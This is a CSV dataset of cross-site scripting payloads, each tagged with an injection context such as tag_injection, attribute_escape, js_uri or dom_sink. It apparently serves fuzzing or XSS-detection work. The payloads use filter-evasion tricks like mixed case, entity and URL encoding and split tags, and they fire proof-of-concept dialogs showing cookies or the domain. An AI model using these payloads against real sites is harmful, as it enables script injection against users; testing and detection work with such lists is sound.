payload,context
"""><Svg onFocUs=AleRt(LocAtiOn.HasH)>",tag_injection
"""><svg onclick=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
%3Csvg onmouseover=prompt(document.cookie)%3E,tag_injection
""" onload=prompt(document.cookie) """,attribute_escape
%27 onbegin=console.log(document.domain) %27,attribute_escape
<script>/*/&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</script>,script_injection
"""%3E%3Csvg onmouseenter=console.log(document.domain)%3E",tag_injection
""" onfocus=confirm(document.cookie) autofocus=""",attribute_escape
javascript:void(alert(%27XSS%27)),js_uri
<svG oNtoGglE=cOnfIrm(1)>,tag_injection
""" ontoggl&#101;=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
"""><svg onload=\u0061lert(location.hash)>",tag_injection
%22 onfocus=alert(document.domain) autofocus=%22,attribute_escape
' onfocus=alert(1) ',attribute_escape
"""%3E%3Csvg onbegin=alert(location.hash)%3E",tag_injection
"' oNmoUseEntEr=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
%27 onmouseover=console.log(location.hash) %27,attribute_escape
<svg onload=prompt('XSS')/>,tag_injection
"%27 onfocus=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
%22><svg ontoggle=prompt(1)>,tag_injection
<script>//console.log(%27XSS%27)</script>,script_injection
"""><svg onmouseover=confirm(1)>",tag_injection
<scRipT>/X/cOnsOle.loG(1)</ScrIpt>,script_injection
<svG oNclIck=coNsoLe.Log(doCumEnt.coOkiE)>,tag_injection
<svG oNmoUseEntEr=ConFirM(dOcuMenT.cOokIe)/>,tag_injection
%3Csvg onfocus=console.log('XSS')%3E,tag_injection
' oNmoUseOveR=cOnfIrm(doCumEnt.coOkiE) ',attribute_escape
""" onclick=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape
' ontoggl&#101;=&#97;l&#101;rt('XSS') ',attribute_escape
"%3Csvg onbegin=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
' onerror=console.log(1) ',attribute_escape
%3Csvg onerror=console.log('XSS')/%3E,tag_injection
"eval(""alert(1)"")",dom_sink
<scr	ipt>//console.log(1)</scr	ipt>,script_injection
"""><Svg onMouSeeNteR=cOnfIrm(loCatIon.haSh)>",tag_injection
"""%3E%3Csvg onfocus=console.log(1)%3E",tag_injection
' oNclIck=prOmpT(lOcaTioN.hAsh) ',attribute_escape
"<scRipT>pRomPt(StrIng.frOmCHarCodE(88,83,83))</sCriPt>",script_injection
"""%3E%3Csvg onbegin=alert('XSS')%3E",tag_injection
%22><svg onclick=alert(location.hash)>,tag_injection
<svg onb&#101;gin=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection
"<img onload=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection
%3Cscript%3E/x/prompt(1)%3C/script%3E,script_injection
"""><Svg onLoaD=aLerT(dOcuMenT.cOokIe)>",tag_injection
' oNerRor=alErt(doCumEnt.doMaiN) ',attribute_escape
%22 onclick=alert(document.cookie) %22,attribute_escape
"<svG oNbeGin=coNfiRm(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
"""%3E%3Csvg ontoggle=prompt(1)%3E",tag_injection
"""><Svg onMouSeoVer=alErt(doCumEnt.coOkiE)>",tag_injection
"' onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
""" onfocus=consol&#101;.log(loc&#97;tion.h&#97;sh) &#97;utofocus=""",attribute_escape
""" onmouseenter=confirm(document.cookie) """,attribute_escape
' onfocus=alert('XSS') ',attribute_escape
""" oNmoUseOveR=pRomPt(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
<scRipT>pRomPt('XSS')</sCriPt>,script_injection
""" oNmoUseOveR=cOnfIrm('XSS') """,attribute_escape
<svg onbegin=confirm(location.hash)/>,tag_injection
<svG oNmoUseOveR=pRomPt(1)/>,tag_injection
<svg onbegin=alert(location.hash)>,tag_injection
<svg onfocus=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
""" oNtoGglE=cOnfIrm('XSS') """,attribute_escape
' oNclIck=prOmpT('XSS') ',attribute_escape
<svg onmous&#101;&#101;nt&#101;r=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
<svg onmouseover=alert(location.hash)>,tag_injection
"%27 onmouseover=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
"""><Svg onBegIn=ConFirM(lOcaTioN.hAsh)>",tag_injection
""" oNmoUseEntEr=AleRt(DocUmeNt.DomAin) """,attribute_escape
<svG oNmoUseOveR=pRomPt(LocAtiOn.HasH)/>,tag_injection
""" onload=confirm(location.hash) """,attribute_escape
%3Csvg ontoggle=console.log(document.cookie)%3E,tag_injection
' onload=prompt('XSS') ',attribute_escape
%3Cscript%3E/x/console.log(document.domain)%3C/script%3E,script_injection
j&#97;vascript:confirm(document.cookie),js_uri
""" onfocus=alert(String.fromCharCode(88,83,83)) autofocus=""",attribute_escape
""" onclick=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
<svg ontoggle=\u0061lert(1)/>,tag_injection
%22><svg onload=alert(document.cookie)>,tag_injection
<scRipT>aLerT(1)</ScrIpt>,script_injection
<script>/x/prompt(document.domain)</script>,script_injection
"' oNloAd=ConFirM(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
%22 onload=prompt(document.cookie) %22,attribute_escape
"""><svg onload=prompt(document.cookie)>",tag_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)>"")",dom_sink
<svg onb&#101;gin=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
%3Cscript%3E/*/confirm(1)%3C/script%3E,script_injection
"eval(""confirm(1)"")",dom_sink
<script>/x/confirm(loc&#97;tion.h&#97;sh)</script>,script_injection
"""><svg ontoggl&#101;=prompt(1)>",tag_injection
<svg on&#101;rror=consol&#101;.log('XSS')>,tag_injection
""" onerror=prompt('XSS') """,attribute_escape
"""><svg on&#101;rror=confirm(1)>",tag_injection
%3Csvg onfocus=alert(document.domain)/%3E,tag_injection
%3Cscript%3E//prompt('XSS')%3C/script%3E,script_injection
<svG oNloAd=ConFirM('XSS')/>,tag_injection
%3Cscript%3E/*/alert('XSS')%3C/script%3E,script_injection
javascript:void(console.log(document.domain)),js_uri
%3Csvg onmouseenter=confirm(document.cookie)/%3E,tag_injection
""" onb&#101;gin=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<svG oNloAd=ProMpt('XSS')/>,tag_injection
%3Cscript%3Eprompt('XSS')%3C/script%3E,script_injection
""" onload=alert(1) """,attribute_escape
"eval(""console.log(location.hash)"")",dom_sink
"setTimeout(%22console.log(document.cookie)%22,0)",dom_sink
' ontoggle=prompt(document.cookie) ',attribute_escape
' ontoggle=console.log('XSS') ',attribute_escape
<scRipT>pRomPt(DocUmeNt.CooKie)</ScrIpt>,script_injection
"""><Svg onBegIn=ProMpt(1)>",tag_injection
<svG oNmoUseOveR=pRomPt('XSS')/>,tag_injection
%22><svg onfocus=alert(location.hash)>,tag_injection
"""%3E%3Csvg onmouseenter=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
%3Cscript%3Ealert('XSS')%3C/script%3E,script_injection
<svg ontoggle=console.log('XSS')/>,tag_injection
' onfocus=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape
%22 onbegin=alert(1) %22,attribute_escape
<svG oNerRor=prOmpT(1)/>,tag_injection
' oNerRor=alErt(doCumEnt.coOkiE) ',attribute_escape
%27 onerror=confirm(document.cookie) %27,attribute_escape
' oNmoUseOveR=cOnfIrm(1) ',attribute_escape
""" onmouseover=console.log('XSS') """,attribute_escape
' on&#101;rror=prompt(1) ',attribute_escape
""" onlo&#97;d=consol&#101;.log('XSS') """,attribute_escape
%22><svg onmouseover=alert(document.cookie)>,tag_injection
""" onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape
' oNfoCus=coNfiRm(DocUmeNt.DomAin) ',attribute_escape
<svg onfocus=console.log(document.cookie)>,tag_injection
%3Csvg onmouseenter=confirm(document.domain)%3E,tag_injection
<svG oNbeGin=alErt(1)>,tag_injection
<scr	ipt>//confirm(1)</scr	ipt>,script_injection
"""><Svg onBegIn=ConSolE.lOg(DocUmeNt.CooKie)>",tag_injection
""" onbegin=alert(document.domain) """,attribute_escape
%22 ontoggle=prompt(location.hash) %22,attribute_escape
"SetTimEouT(""ConSolE.lOg(DocUmeNt.DomAin)"",0)",dom_sink
%3Csvg onclick=prompt(document.cookie)/%3E,tag_injection
%22 onbegin=confirm(document.cookie) %22,attribute_escape
' onbegin=confirm(document.cookie) ',attribute_escape
"SetTimEouT(""ProMpt(loCatIon.haSh)"",0)",dom_sink
<img onload=prompt(1)>,tag_injection
%3Csvg onmouseover=prompt(location.hash)/%3E,tag_injection
<scr	ipt>alert('XSS')</scr	ipt>,script_injection
<svg onfocus=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection
<script>prompt`%27XSS%27`</script>,script_injection
%3Cscript%3Econsole.log`document.domain`%3C/script%3E,script_injection
<svg onbegin=alert(%27XSS%27)/>,tag_injection
%22 onerror=alert(document.domain) %22,attribute_escape
%3Csvg onmouseover=alert(location.hash)%3E,tag_injection
"%27 onclick=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
"' oNtoGglE=pRomPt(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
' oNtoGglE=pRomPt(DocUmeNt.CooKie) ',attribute_escape
<svg onmous&#101;ov&#101;r=confirm(1)>,tag_injection
"""%3E%3Csvg onclick=console.log('XSS')%3E",tag_injection
J&#97;VasCriPt:ConFirM('XSS'),js_uri
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=pRomPt(DocUmeNt.CooKie)>"")",dom_sink
""" oNmoUseOveR=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
"%3Csvg onclick=alert(String.fromCharCode(88,83,83))%3E",tag_injection
"""><Svg onCliCk=ProMpt(loCatIon.haSh)>",tag_injection
<svg onmouseover=prompt(document.domain)>,tag_injection
<img onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>,tag_injection
%3Csvg onmouseover=alert('XSS')%3E,tag_injection
<svg ontoggl&#101;=prompt(1)>,tag_injection
j&#97;v&#97;script:prompt('XSS'),js_uri
eval(%22alert(document.domain)%22),dom_sink
<script>console.log(location.hash)</script>,script_injection
%3Csvg onmouseenter=console.log(location.hash)%3E,tag_injection
"<script>prompt(String.fromCharCode(88,83,83))</script>",script_injection
<svg onload=confirm(1)/>,tag_injection
<svg onmouseover=confirm(1)/>,tag_injection
<svg onfocus=confirm(location.hash)>,tag_injection
""" oNfoCus=coNsoLe.Log(loCatIon.haSh) """,attribute_escape
"""><img onload=\u0061lert(location.hash)>",tag_injection
"setTimeout(%22prompt(String.fromCharCode(88,83,83))%22,0)",dom_sink
"""%3E%3Csvg onerror=prompt(location.hash)%3E",tag_injection
<svg onclick=console.log(document.domain)/>,tag_injection
""" oNclIck=coNfiRm('XSS') """,attribute_escape
"%22 onfocus=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
"""><svg onclick=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
<svg onmouseenter=alert(location.hash)>,tag_injection
<img onload=alert(1)>,tag_injection
"<script>/x/prompt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
""" ontoggle=console.log(document.domain) """,attribute_escape
<script>&#97;l&#101;rt`docum&#101;nt.dom&#97;in`</script>,script_injection
<svG oNerRor=alErt(doCumEnt.coOkiE)/>,tag_injection
%22><svg ontoggle=console.log(document.domain)>,tag_injection
<script>alert`location.hash`</script>,script_injection
%3Csvg onerror=alert(document.cookie)/%3E,tag_injection
' oNclIck=coNfiRm(LocAtiOn.HasH) ',attribute_escape
' oNtoGglE=aLerT(dOcuMenT.cOokIe) ',attribute_escape
<script>/*/confirm(loc&#97;tion.h&#97;sh)</script>,script_injection
<script>/x/consol&#101;.log(1)</script>,script_injection
<svG oNtoGglE=cOnfIrm(1)/>,tag_injection
' onlo&#97;d=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
%3Csvg onload=confirm(document.domain)/%3E,tag_injection
<scr	ipt>//prompt(document.cookie)</scr	ipt>,script_injection
<svg onload=alert('XSS')/>,tag_injection
<svg onmouseover=confirm('XSS')/>,tag_injection
' onload=\u0061lert(document.cookie) ',attribute_escape
"<scRipT>cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))</scRipT>",script_injection
"""><svg onlo&#97;d=confirm(docum&#101;nt.cooki&#101;)>",tag_injection
""" on&#101;rror=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=aLerT(lOcaTioN.hAsh)>"")",dom_sink
<scRipT>//alErt(loCatIon.haSh)</sCriPt>,script_injection
""" onload=console.log(1) """,attribute_escape
""" onload=\u0061lert(document.cookie) """,attribute_escape
' onlo&#97;d=consol&#101;.log(docum&#101;nt.cooki&#101;) ',attribute_escape
"""><Svg onBegIn=AleRt(DocUmeNt.CooKie)>",tag_injection
<svg onmouseover=confirm(document.domain)>,tag_injection
""" oNmoUseEntEr=AleRt(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
<svg onclick=&#97;l&#101;rt('XSS')/>,tag_injection
' onload=prompt(document.domain) ',attribute_escape
"%3Csvg ontoggle=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
javascript:void(console.log('XSS')),js_uri
"s&#101;tTim&#101;out(""confirm(String.fromCh&#97;rCod&#101;(88,83,83))"",0)",dom_sink
<svg ontoggle=console.log(document.domain)>,tag_injection
<svG oNfoCus=coNfiRm(DocUmeNt.CooKie)>,tag_injection
"""><svg ontoggle=prompt(1)>",tag_injection
eval(%22confirm(document.domain)%22),dom_sink
"' onfocus=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
""" oNfoCus=alErt('XSS') """,attribute_escape
"""><svg onfocus=confirm(location.hash)>",tag_injection
<script>confirm`docum&#101;nt.cooki&#101;`</script>,script_injection
"""><svg on&#101;rror=consol&#101;.log(1)>",tag_injection
%27 onbegin=console.log(document.cookie) %27,attribute_escape
' onfocus=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
""" onfocus=alert('XSS') """,attribute_escape
<script>//prompt(1)</script>,script_injection
""" oNloAd=ConFirM('XSS') """,attribute_escape
"<svG oNerRor=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
%3Cscript%3E/*/console.log('XSS')%3C/script%3E,script_injection
"""><Svg onCliCk=ConFirM('XSS')>",tag_injection
<svg onmous&#101;&#101;nt&#101;r=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection
"' onfocus=console.log(String.fromCharCode(88,83,83)) '",attribute_escape
%3Cscript%3Eprompt`document.cookie`%3C/script%3E,script_injection
""" oNbeGin=coNfiRm(LocAtiOn.HasH) """,attribute_escape
<svg onmouseover=prompt('XSS')>,tag_injection
"""><Svg onErrOr=ConSolE.lOg(DocUmeNt.DomAin)>",tag_injection
%22><img onload=alert(document.domain)>,tag_injection
""" onb&#101;gin=prompt(docum&#101;nt.cooki&#101;) """,attribute_escape
JavAscRipT:cOnsOle.loG(lOcaTioN.hAsh),js_uri
<svG oNtoGglE=cOnfIrm(doCumEnt.doMaiN)/>,tag_injection
"""><svg onmouseover=confirm(location.hash)>",tag_injection
<svg onbegin=confirm(document.cookie)>,tag_injection
%27 ontoggle=confirm(document.domain) %27,attribute_escape
<script>prompt`document.domain`</script>,script_injection
"""><svg onerror=confirm(String.fromCharCode(88,83,83))>",tag_injection
' onb&#101;gin=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
"""><svg onmouseover=prompt(document.cookie)>",tag_injection
""" on&#101;rror=confirm('XSS') """,attribute_escape
""" onlo&#97;d=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape
j&#97;vascr	ipt:confirm(location.hash),js_uri
"""><Svg onMouSeeNteR=cOnfIrm(1)>",tag_injection
<svg onmous&#101;ov&#101;r=confirm(loc&#97;tion.h&#97;sh)/>,tag_injection
""" onerror=\u0061lert(1) """,attribute_escape
"""><img onlo&#97;d=&#97;l&#101;rt(1)>",tag_injection
%22 onclick=alert(location.hash) %22,attribute_escape
%3Cscript%3E/*/alert(document.cookie)%3C/script%3E,script_injection
<script>//&#97;l&#101;rt('XSS')</script>,script_injection
<svG oNfoCus=alErt(1)>,tag_injection
"""%3E%3Csvg ontoggle=prompt('XSS')%3E",tag_injection
"' onclick=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
"""><svg onb&#101;gin=confirm('XSS')>",tag_injection
' oNmoUseEntEr=ConFirM(lOcaTioN.hAsh) ',attribute_escape
""" onerror=alert(String.fromCharCode(88,83,83)) """,attribute_escape
' onfocus=confirm(location.hash) ',attribute_escape
""" onmouseover=\u0061lert(document.cookie) """,attribute_escape
<svg onerror=prompt('XSS')>,tag_injection
%22 onmouseover=confirm(document.cookie) %22,attribute_escape
<svg onclick=confirm(document.cookie)/>,tag_injection
"""><svg onmouseenter=console.log(document.domain)>",tag_injection
""" oNmoUseOveR=pRomPt(DocUmeNt.DomAin) """,attribute_escape
<svG oNerRor=alErt('XSS')>,tag_injection
<svg onbegin=confirm(%27XSS%27)/>,tag_injection
<svg onload=confirm(document.cookie)/>,tag_injection
<svg onb&#101;gin=confirm(1)/>,tag_injection
%22><svg onclick=console.log(location.hash)>,tag_injection
"<svg onfocus=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"%27 onbegin=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
<script>alert`document.cookie`</script>,script_injection
' onmouseover=prompt(document.domain) ',attribute_escape
"<svg onclick=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
<svG oNbeGin=coNsoLe.Log(doCumEnt.coOkiE)/>,tag_injection
' oNmoUseOveR=cOnsOle.loG(dOcuMenT.dOmaIn) ',attribute_escape
%3Csvg onload=prompt(document.cookie)/%3E,tag_injection
<svg ontoggle=console.log(1)>,tag_injection
"""><svg on&#101;rror=prompt('XSS')>",tag_injection
""" onfocus=confirm(1) """,attribute_escape
<svG oNfoCus=coNsoLe.Log('XSS')>,tag_injection
' ontoggl&#101;=consol&#101;.log(1) ',attribute_escape
<script>/*/&#97;l&#101;rt('XSS')</script>,script_injection
%22 onbegin=console.log(document.domain) %22,attribute_escape
"<svg onclick=confirm(String.fromCharCode(88,83,83))>",tag_injection
%22><svg onbegin=prompt(%27XSS%27)>,tag_injection
"document.write(""<img src=x onerror=prompt(1)>"")",dom_sink
' oNmoUseOveR=cOnsOle.loG(dOcuMenT.cOokIe) ',attribute_escape
"document.write(""<img src=x onerror=alert(document.cookie)>"")",dom_sink
"""><svg onfocus=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
%22 onbegin=console.log(1) %22,attribute_escape
<script>/x/alert(document.cookie)</script>,script_injection
' onload=console.log(document.domain) ',attribute_escape
""" onfocus=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape
%22><svg onmouseover=prompt(%27XSS%27)>,tag_injection
""" oNfoCus=coNfiRm(1) AutOfoCus=""",attribute_escape
<script>/*/&#97;l&#101;rt(loc&#97;tion.h&#97;sh)</script>,script_injection
%3Csvg onload=console.log('XSS')/%3E,tag_injection
<svg ontoggle=console.log('XSS')>,tag_injection
<svg onmouseover=prompt(1)>,tag_injection
"""><Svg onTogGle=prOmpT(1)>",tag_injection
<svg onerror=console.log(%27XSS%27)>,tag_injection
<scr	ipt>/*/confirm('XSS')</scr	ipt>,script_injection
javascript:\u0061lert(location.hash),js_uri
""" on&#101;rror=consol&#101;.log(1) """,attribute_escape
"""><svg onload=alert(1)>",tag_injection
"""><svg on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
"""><svg ontoggl&#101;=confirm('XSS')>",tag_injection
<svg onload=console.log(document.cookie)/>,tag_injection
"<svg onmouseenter=confirm(String.fromCharCode(88,83,83))/>",tag_injection
j&#97;v&#97;script:confirm(loc&#97;tion.h&#97;sh),js_uri
"""><img onlo&#97;d=&#97;l&#101;rt('XSS')>",tag_injection
%3Csvg onclick=prompt(document.cookie)%3E,tag_injection
' ontoggle=console.log(location.hash) ',attribute_escape
javascript:void(alert(1)),js_uri
"<svg onfocus=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
""" onclick=confirm(document.cookie) """,attribute_escape
"""><Svg onFocUs=ProMpt(doCumEnt.doMaiN)>",tag_injection
<svg onfocus=alert(1)>,tag_injection
""" onbegin=prompt(1) """,attribute_escape
<svg onfocus=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
"""><Svg onCliCk=ConFirM(STriNg.FroMChArCOde(88,83,83))>",tag_injection
<svg onmouseover=confirm(%27XSS%27)/>,tag_injection
%3Cscript%3Econfirm`location.hash`%3C/script%3E,script_injection
<svg onfocus=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
%22><svg onmouseenter=alert(location.hash)>,tag_injection
<svG oNfoCus=prOmpT(lOcaTioN.hAsh)/>,tag_injection
"%3Csvg onclick=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
""" ontoggle=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
<svg onmouseover=alert(location.hash)/>,tag_injection
j&#97;vascript:alert('XSS'),js_uri
""" onfocus=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
<scRipT>/X/cOnfIrm(1)</sCriPt>,script_injection
<svg onclick=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
%22><svg onload=confirm(location.hash)>,tag_injection
%3Csvg onclick=console.log(document.domain)/%3E,tag_injection
"""><Svg onLoaD=pRomPt(1)>",tag_injection
